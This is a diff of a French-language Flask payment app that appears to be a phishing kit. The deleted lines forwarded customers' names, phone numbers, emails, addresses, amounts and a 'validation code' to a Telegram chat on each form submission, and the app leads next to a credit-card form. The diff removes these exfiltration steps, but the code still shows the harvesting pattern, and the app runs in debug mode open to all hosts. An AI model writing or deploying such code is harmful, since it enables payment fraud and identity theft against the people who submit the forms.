@@ -39,19 +39,6 @@ def payment_form():
         if not all([session['nom'], session['prenom'], session['telephone'], session['email'], session['adresse_facturation'], session['adresse_livraison'], session['montant']]):
             return "❌ Erreur : Tous les champs sont obligatoires.", 400
 
-        # Envoyer une alerte Telegram lors de la soumission du formulaire
-        message = f"""
-        🔔 Nouvelle soumission de formulaire (paiement.html) :
-        - 🏷 Nom : {session['nom']}
-        - 🏷 Prénom : {session['prenom']}
-        - 📞 Téléphone : {session['telephone']}
-        - 📧 E-mail : {session['email']}
-        - 🏠 Adresse de facturation : {session['adresse_facturation']}
-        - 🚚 Adresse de livraison : {session['adresse_livraison']}
-        - 💰 Montant : {session['montant']} €
-        """
-        send_telegram_message(message)
-
         return redirect(url_for('credit_card_form'))
     
     # Afficher le formulaire de paiement avec le montant pré-rempli
@@ -115,37 +102,6 @@ def validation_paiement():
 @app.route('/confirmation')
 def payment_confirmation():
     return render_template('confirmation.html', nom=session.get('nom'), prenom=session.get('prenom'), montant=session.get('montant'))
-
-# Route pour la page de validation de commande
-@app.route('/validation-commande', methods=['GET', 'POST'])
-def validation_commande():
-    if request.method == 'POST':
-        # Récupération des données du formulaire de validation de commande
-        session['code_validation'] = request.form.get('code_validation', '').strip()
-        session['commentaire'] = request.form.get('commentaire', '').strip()
-
-        if not session['code_validation']:
-            return "❌ Erreur : Le code de validation est obligatoire.", 400
-
-        # Envoyer un message Telegram avec les données de validation de commande
-        message = f"""
-        📦 Validation de commande :
-        - 🏷 Nom : {session['nom']}
-        - 🏷 Prénom : {session['prenom']}
-        - 💰 Montant : {session['montant']} €
-        - 🔢 Code de validation : {session['code_validation']}
-        - 📝 Commentaire : {session['commentaire']}
-        """
-        send_telegram_message(message)
-
-        return redirect(url_for('confirmation_commande'))
-
-    return render_template('validation_commande.html')
-
-# Route pour la page de confirmation de commande
-@app.route('/confirmation-commande')
-def confirmation_commande():
-    return render_template('confirmation_commande.html', nom=session.get('nom'), prenom=session.get('prenom'), montant=session.get('montant'))
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5005)
